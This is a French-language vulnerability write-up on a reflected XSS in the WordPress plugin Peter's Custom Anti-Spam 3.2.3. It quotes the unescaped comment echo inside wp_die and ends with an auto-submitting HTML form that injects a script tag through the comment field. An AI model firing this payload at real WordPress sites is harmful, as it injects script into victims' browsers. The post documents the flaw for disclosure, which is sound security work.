---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress Peter's Custom Anti-Spam"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [Peter’s Custom Anti-Spam](https://wordpress.org/plugins/peters-custom-anti-spam-image/) se présente de cette façon :

> Stop a lot of spambots from polluting your site by making visitors identify a random word displayed as an image before commenting and optionally before registering. You can customize the pool of words to display.

La liste des fonctionnalités peut être vue sur la page wordpress du plugin.

La version testée est la 3.2.3 qui date d'il y a 3 mois au moment de ces lignes.

À noter que d'après le changelog cette version corrige déjà une faille XSS :

```
Change Log:                                                                                                            
2023-08-30  Version 3.2.3  Fix back-end XSS vulnerability
```

En effet, [une vulnérabilité](https://patchstack.com/database/vulnerability/peters-custom-anti-spam-image/wordpress-peter-s-custom-anti-spam-plugin-3-2-2-reflected-cross-site-scripting-xss-vulnerability/) a été trouvée sur les précédentes version.

En raison du manque d'information, il m'est impossible de savoir si elles sont liées. L'auteur indique avoir fixé la vulnérabilité, mais comme le code ne semble pas versionné sur Github difficile de fouiller d'avantage.

## La vulnérabilité

Le code du projet est rassemblé dans un fichier `custom_anti_spam.php` de presque 1300 lignes.

On y trouve une classe avec un constructeur qui hooke la soumission des commentaires en entrée :

```php
class PeterAntiSpam                                                                                                
{                                                                                                                  
    function __construct()                                                                                         
    {                                                                                                              
        $cas_manualinsert = casFunctionCollection::get_settings( 'manualinsert' );                                 
        add_action( 'secure_image', array( $this, 'comment_form' ) );    // add image and input field to comment form
        if( !$cas_manualinsert )                                                                                   
        {                                                                                                          
            add_action( 'comment_form', array( $this, 'comment_form' ) );    // add image and input field to comment form
        }                                                                                                          
        add_filter( 'preprocess_comment', array( $this, 'comment_post') );    // add post comment post security code check
    }
```

D'après [la documentation Wordpress](https://developer.wordpress.org/reference/hooks/preprocess_comment/) :

```
apply_filters( 'preprocess_comment', array $commentdata )

Filters a comment’s data before it is sanitized and inserted into the database.
```

C'est cette fonction de hook qui est vulnérable :

```php
static function comment_post( $incoming_comment )                                                              
{                                                                                                              
    global $cas_textcount, $user_ID, $cas_table, $wpdb;
    --- snip ---
    if( isset( $_POST['matchthis'] ) )                                                                         
    {                                                                                                          
        $matchnum = intval( $_POST['matchthis'] );                                                             
    }                                                                                                          
    else                                                                                                       
    {                                                                                                          
        $matchnum = 0;                                                                                         
    }

    // If the user is not logged in check the security code                                                    
    if( ( $cas_forcereg || 0 == intval( $user_ID ) ) && !is_admin() )                                          
    {                                                                                                          
        $istrackping = $incoming_comment['comment_type'];                                                      
        $commentbody = $incoming_comment['comment_content'];                                                   
        if ( $istrackping == 'pingback' && $cas_allowping )                                                    
        {                                                                                                      
                                                                                                               
            // Send all pingbacks to a moderation queue?                                                       
            if ($cas_modping) add_filter('pre_comment_approved', create_function('$mod_ping', 'return \'0\';'));
        }                                                                                                      
        elseif ( $istrackping == 'trackback' && $cas_allowtrack )                                              
        {                                                                                                      
                                                                                                               
            // Send all trackbacks to a moderation queue?                                                      
            if ($cas_modtrack)                                                                                 
            {                                                                                                  
                add_filter('pre_comment_approved', create_function('$mod_track', 'return \'0\';'));            
            }                                                                                                  
        }                                                                                                      
        else                                                                                                   
        {                                                                                                      
            // Get the anti-spam word from the database                                                        
            $matchthis = $wpdb->get_row('SELECT word, fieldname FROM ' . $cas_table . ' WHERE id = ' . $matchnum);
                                                                                                               
            // If this row doesn't exist, say something                                                        
            if( is_null( $matchthis ) )                                                                        
            {                                                                                                  
                wp_die( '<p>' . __( 'Error: The anti-spam word is invalid. Please report this error to the webmaster. Go back and refresh the page to re-submit your comment.', 'peters_custom_anti_spam' ) . "</p>\n<p>" . $cas_string_copy_field . "</p>\n<textarea cols=\"100%\" rows=\"10\" onclick=\"this.select();\" readonly=\"true\">$commentbody</textarea>" );
            }
```

On voit à la fin que la fonction `die()` destinée à afficher un message d'erreur affiche telle quelle la variable `$commentbody` sans échappement préalable des potentiels caractères HTML.

Ce manquement permet l'injection de code Javascript (XSS).

Pour atteindre à cette ligne de code vulnérable, il faut :

* soumettre un commentaire
* indiquer une valeur de `matchthis` très haute (ou négative) afin qu'il n'y ait pas de correspondance en base pour rentrer dans la gestion d'erreur
* laisser `comment_type` vide afin d'entrer dans le dernier `else`
* spécifier un ID de post valide sur lequel on commente

PoC au format HTML avec auto-submit

```html
<html>
<body>
<form id="myForm" method="POST" action="http://localhost:8000/wp-comments-post.php">
        <input type="hidden" name="author" value="default" />
        <input type="hidden" name="email" value="whatever@mailinator.com" />
        <input type="hidden" name="url" value="https://perdu.com/" />
        <input type="hidden" name="wp-comment-cookies-consent" value="yes" />
        <input type="hidden" name="submit" value="Post Comment" />
        <input type="hidden" name="comment_post_ID" value="4" />
        <input type="hidden" name="comment_parent" value="0" />
        <input type="hidden" name="matchthis" value="-1" />
        <input type="hidden" name="comment" value="&lt;/textarea&gt;&lt;ScRiPt&gt;alert(/XSS/)&lt;/sCrIpT&gt;" />
</form>
<script>document.createElement('form').submit.call(document.getElementById('myForm'));</script>
</body>
</html>
```
